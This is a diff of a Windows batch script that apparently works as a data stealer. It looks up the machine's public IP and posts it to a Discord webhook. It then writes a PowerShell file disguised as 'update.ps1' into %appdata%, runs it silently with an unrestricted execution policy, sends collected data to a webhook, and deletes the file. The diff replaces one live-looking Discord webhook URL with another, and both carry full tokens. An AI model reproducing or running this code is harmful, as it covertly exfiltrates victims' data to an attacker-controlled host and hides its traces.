@@ -4,7 +4,7 @@ for /f "usebackq delims=" %%A in (`curl -s "ifconfig.me"`) do (
     set "IP=%%A"
 )
 
-set "webhook=https://discord.com/api/webhooks/1451648300699615395/hzS6vwdXREtutf5Hv1VVkEwfBQw7eWxUfN0BV5iLE7nuuxQo7UUf4TSZDqyi-moZtMwQ"
+set "webhook=https://discord.com/api/webhooks/1453880599554031677/wrsh_F5nusrcuThzn-mB9HKSkEZaNDGdwNXeWhZJ4tDrEeKTqDSx5bpq6EUAbc29iDBU"
 curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```%IP%```\"}" %webhook%
 if exist %appdata%\update.ps1 del /s /q %appdata%\update.ps1 >nul
 set webhook=https://discord.com/api/webhooks/1451648300699615395/hzS6vwdXREtutf5Hv1VVkEwfBQw7eWxUfN0BV5iLE7nuuxQo7UUf4TSZDqyi-moZtMwQ
@@ -44,4 +44,5 @@ echo     $JSON = $hash ^| convertto-json>>%appdata%\update.ps1
 echo     Invoke-WebRequest -uri $webhook_url -Method POST -Body $JSON -Headers @{'Content-Type' = 'application/json'}>>%appdata%\update.ps1
 echo }>>%appdata%\update.ps1
 powershell.exe -executionpolicy unrestricted "%appdata%\Update.ps1" >nul 2>&1
+
 del %appdata%\Update.ps1
